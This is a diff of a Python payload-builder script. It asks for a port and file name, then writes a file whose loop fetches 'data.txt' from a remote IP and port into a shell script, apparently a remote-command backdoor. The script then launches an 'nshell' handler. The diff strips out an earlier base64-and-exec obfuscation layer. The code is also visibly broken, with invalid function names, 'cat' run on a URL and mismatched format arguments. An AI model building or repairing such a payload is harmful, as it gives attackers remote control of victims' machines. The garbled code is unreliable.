@@ -8,7 +8,7 @@ opt2 = input("LPORT: ")
 opt3 = input("name: ")
 op = open(opt3 + ".py", "w")
 cod = """import os, time
-os.system("python3 -m http.server 8080 &")
+os.system("python3 -m http.server {} &")
 def get-put(ip):
 	os.system("cat http://{}:{}/data.txt >> data.sh".format(ip))
 	time.sleep(0.5)
@@ -18,13 +18,7 @@ def get-put(ip):
 	os.remove("data")
 	os.system("clear")
 while True:
-	get(ip)""".format(opt, opt2)
-cod1 = base64.b64encode(byte(str(cod)))
-op1 = op.write("""
-import os
-import base64
-import time
-
-exec(base64.b64decode(cod))""")
+	get(ip)""".format(opt2, opt, opt2)
+op1 = op.write(cod)
 os.chdir("../nshell/")
 os.system("python3 nshell.py")
